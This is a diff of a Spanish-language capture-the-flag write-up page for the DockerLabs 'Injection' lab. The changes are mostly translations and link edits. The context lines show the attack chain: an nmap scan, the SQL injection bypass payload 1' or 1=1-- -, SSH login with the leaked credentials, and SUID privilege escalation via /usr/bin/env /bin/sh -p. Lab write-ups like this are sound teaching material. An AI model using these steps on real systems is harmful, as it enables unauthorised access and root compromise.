@@ -196,30 +196,31 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">dockerlabs</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">dockerlabs</a> /
       <span>injection</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span>Injection</span></h1>
-    <p class="writeup-subtitle">DockerLabs — Linux · SQL Injection bypass → credenciales en claro → SSH dylan → SUID env → root</p>
+    <p class="writeup-subtitle">DockerLabs — Linux · Bypass de inyección SQL → credenciales en claro → SSH dylan → SUID env → root</p>
     <div class="writeup-meta">
       <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-docker">DOCKERLABS</span>
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-sqli">SQL INJECTION</span>
       <span class="meta-badge badge-suid">SUID · PrivEsc</span>
-      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Mayo 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -235,7 +236,7 @@
         <li><a href="#resumen">01 · Resumen</a></li>
         <li><a href="#despliegue">02 · Despliegue</a></li>
         <li><a href="#reconocimiento">03 · Reconocimiento</a></li>
-        <li><a href="#sqli">04 · SQL Injection</a></li>
+        <li><a href="#sqli">04 · Inyección SQL</a></li>
         <li><a href="#acceso">05 · Acceso SSH</a></li>
         <li><a href="#privesc">06 · Escalada · SUID env</a></li>
         <li><a href="#referencia">07 · Referencia de Comandos</a></li>
@@ -247,13 +248,13 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">DockerLabs</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-green">Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
       <div class="info-row"><span class="info-label">Puertos</span><span class="info-val val-green">22 SSH · 80 HTTP</span></div>
       <div class="info-row"><span class="info-label">Vuln</span><span class="info-val val-red">SQLi · SUID env</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>auto_deploy.sh</span> → laboratorio activo en 172.17.0.2</div></div>
         <div class="ap-line"></div>
@@ -263,7 +264,7 @@
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>1' or 1=1-- -</span> → bypass + password en claro</div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH dylan</span> → acceso con creds reveladas</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH dylan</span> → acceso con credenciales reveladas</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>find SUID</span> → /usr/bin/env con bit SUID</div></div>
         <div class="ap-line"></div>
@@ -293,7 +294,7 @@
         </p>
         <p>
           El vector de entrada es un formulario de login PHP vulnerable a
-          <span class="hl-red">SQL Injection clásica</span>. Al inyectar
+          <span class="hl-red">Inyección SQL clásica</span>. Al inyectar
           <code style="color:var(--red)">1' or 1=1-- -</code> en el campo de usuario,
           la consulta SQL siempre evalúa como verdadera, autenticando sin credenciales
           válidas y revelando la contraseña en texto claro del usuario
@@ -317,7 +318,7 @@
           <tr><td>Despliegue</td><td>auto_deploy.sh injection.tar</td><td>Contenedor activo en 172.17.0.2</td></tr>
           <tr><td>Reconocimiento</td><td>ping + nmap -p- -sSCV + xsltproc</td><td>22 SSH (OpenSSH 8.9p1) · 80 HTTP (Apache 2.4.52)</td></tr>
           <tr><td>Enumeración Web</td><td>Navegador → :80</td><td>Login PHP con PHPSESSID — vulnerable a SQLi</td></tr>
-          <tr><td>Explotación</td><td>SQL Injection: 1' or 1=1-- -</td><td>Bypass auth + password dylan en claro</td></tr>
+          <tr><td>Explotación</td><td>Inyección SQL: 1' or 1=1-- -</td><td>Bypass auth + password dylan en claro</td></tr>
           <tr><td>Acceso inicial</td><td>ssh dylan@172.17.0.2</td><td>Shell como usuario dylan</td></tr>
           <tr><td>PrivEsc</td><td>find SUID + GTFObins env /bin/sh -p</td><td>Shell como root</td></tr>
         </tbody>
@@ -349,7 +350,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh injection.tar">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DEPLOY</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">injection.tar</span></span></div>
       </div>
@@ -388,7 +389,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping 172.17.0.2 -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PING</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">172.17.0.2</span> <span class="flag">-c 3</span></span></div>
       </div>
@@ -422,7 +423,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX injection.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">172.17.0.2</span> <span class="flag">-oX</span> <span class="arg">injection.xml</span></span></div>
       </div>
@@ -457,7 +458,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl injection.xml > injection.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLTPROC</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">injection.xml</span> &gt; <span class="arg">injection.html</span></span></div>
       </div>
@@ -468,7 +469,7 @@
     <!-- SQL INJECTION -->
     <div class="section" id="sqli">
       <p class="section-label">// 04</p>
-      <h2 class="section-title">SQL Injection — Bypass de Autenticación</h2>
+      <h2 class="section-title">Inyección SQL — Bypass de Autenticación</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -488,7 +489,7 @@
           <code style="color:var(--red)">SELECT * FROM users WHERE user='$input' AND password='$pass'</code>
         </p>
         <p>
-          Esta construcción clásica es vulnerable a <span class="hl-red">SQL Injection</span>
+          Esta construcción clásica es vulnerable a <span class="hl-red">Inyección SQL</span>
           si los parámetros no están sanitizados ni parametrizados con
           <strong>prepared statements</strong>.
         </p>
@@ -519,7 +520,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="1' or 1=1-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLi PAYLOAD</span>
         <div><span class="prompt">User: </span><span class="sqli">1' or 1=1-- -</span></div>
         <div><span class="prompt">Pass: </span><span class="cmd">[cualquier valor]</span></div>
@@ -575,7 +576,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ssh dylan@172.17.0.2">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">dylan@172.17.0.2</span></span></div>
       </div>
@@ -597,7 +598,7 @@
     <!-- PRIVESC -->
     <div class="section" id="privesc">
       <p class="section-label">// 06</p>
-      <h2 class="section-title">Escalada de Privilegios — SUID env</h2>
+      <h2 class="section-title">Escalada de privilegios — SUID env</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -620,7 +621,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FIND SUID</span>
         <div><span class="prompt-ssh">dylan@ae8d8a92e02e:~$ </span><span class="cmd">find / <span class="flag">-perm -4000</span> <span class="arg">2>/dev/null</span></span></div>
       </div>
@@ -671,7 +672,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="/usr/bin/env /bin/sh -p">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC</span>
         <div><span class="prompt-ssh">dylan@ae8d8a92e02e:~$ </span><span class="cmd">/usr/bin/env <span class="arg">/bin/sh</span> <span class="flag">-p</span></span></div>
       </div>
@@ -695,9 +696,9 @@
         <div><span class="o-green"># cd /root</span></div>
         <div><span class="o-green"># ls -la</span></div>
         <div>total 32</div>
-        <div>drwx------&nbsp; 1 root root 4096 May 13 2024 .</div>
-        <div>drwxr-xr-x 1 root root 4096 May 29 06:53 ..</div>
-        <div>-rw-------&nbsp; 1 root root&nbsp;&nbsp; 59 May 13 2024 .bash_history</div>
+        <div>drwx------&nbsp; 1 root root 4096 Mayo 13 2024 .</div>
+        <div>drwxr-xr-x 1 root root 4096 Mayo 29 06:53 ..</div>
+        <div>-rw-------&nbsp; 1 root root&nbsp;&nbsp; 59 Mayo 13 2024 .bash_history</div>
         <div>-rw-r--r--  1 root root 3106 Oct 15 2021 .bashrc</div>
         <div>drwxr-xr-x  3 root root 4096 Mar 25 2024 .local</div>
         <div>-rw-------&nbsp; 1 root root&nbsp; 979 Mar 25 2024 .mysql_history</div>
@@ -750,7 +751,7 @@
           </ul>
         </div>
         <div class="cmd-ref-card">
-          <div class="cmd-ref-name">SQL Injection básica</div>
+          <div class="cmd-ref-name">Inyección SQL básica</div>
           <div class="cmd-ref-syntax">1' or 1=1-- -</div>
           <div class="cmd-ref-desc">Payload de bypass de autenticación para consultas SQL sin prepared statements.</div>
           <ul class="cmd-ref-flags">
@@ -803,8 +804,8 @@
       <div class="glosario-grid">
 
         <div class="glos-card">
-          <div class="glos-term">SQL Injection (SQLi) — Inyección SQL</div>
-          <div class="glos-def"><strong>SQL Injection</strong> es una vulnerabilidad de seguridad web que ocurre cuando una aplicación incorpora datos controlados por el usuario directamente en consultas SQL sin sanitización. El atacante puede alterar la lógica de la consulta, bypassear autenticación, extraer datos de la base de datos, modificar o eliminar registros, e incluso ejecutar comandos del OS en algunos casos (ej: <code>xp_cmdshell</code> en SQL Server). La prevención correcta usa <strong>prepared statements</strong> (consultas parametrizadas) donde los datos del usuario son siempre tratados como datos, nunca como código SQL. En PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE user=?"); $stmt->execute([$input]);</code>. OWASP clasifica SQLi como A03:2021 en el Top 10.</div>
+          <div class="glos-term">Inyección SQL (SQLi) — Inyección SQL</div>
+          <div class="glos-def"><strong>Inyección SQL</strong> es una vulnerabilidad de seguridad web que ocurre cuando una aplicación incorpora datos controlados por el usuario directamente en consultas SQL sin sanitización. El atacante puede alterar la lógica de la consulta, bypassear autenticación, extraer datos de la base de datos, modificar o eliminar registros, e incluso ejecutar comandos del OS en algunos casos (ej: <code>xp_cmdshell</code> en SQL Server). La prevención correcta usa <strong>prepared statements</strong> (consultas parametrizadas) donde los datos del usuario son siempre tratados como datos, nunca como código SQL. En PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE user=?"); $stmt->execute([$input]);</code>. OWASP clasifica SQLi como A03:2021 en el Top 10.</div>
         </div>
 
         <div class="glos-card">
@@ -829,7 +830,7 @@
 
         <div class="glos-card">
           <div class="glos-term">Prepared Statements — Prevención de SQLi</div>
-          <div class="glos-def">Los <strong>prepared statements</strong> (sentencias preparadas) son la defensa principal contra SQL Injection. Separan el código SQL de los datos del usuario en dos fases: primero se envía la estructura de la query con placeholders (<code>?</code> o <code>:nombre</code>) al servidor de base de datos, que la compila; luego se envían los datos del usuario por separado. El servidor de BD trata los datos siempre como valores literales, nunca como código SQL, imposibilitando la inyección. En PHP con PDO: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE user=? AND pass=?"); $stmt->execute([$user, $pass]);</code>. En MySQL nativo: <code>PREPARE stmt FROM 'SELECT * FROM users WHERE user=?'; EXECUTE stmt USING @user;</code></div>
+          <div class="glos-def">Los <strong>prepared statements</strong> (sentencias preparadas) son la defensa principal contra Inyección SQL. Separan el código SQL de los datos del usuario en dos fases: primero se envía la estructura de la query con placeholders (<code>?</code> o <code>:nombre</code>) al servidor de base de datos, que la compila; luego se envían los datos del usuario por separado. El servidor de BD trata los datos siempre como valores literales, nunca como código SQL, imposibilitando la inyección. En PHP con PDO: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE user=? AND pass=?"); $stmt->execute([$user, $pass]);</code>. En MySQL nativo: <code>PREPARE stmt FROM 'SELECT * FROM users WHERE user=?'; EXECUTE stmt USING @user;</code></div>
         </div>
 
       </div>
@@ -839,9 +840,9 @@
 </div>
 
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Injection · DockerLabs</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // TOC ACTIVE
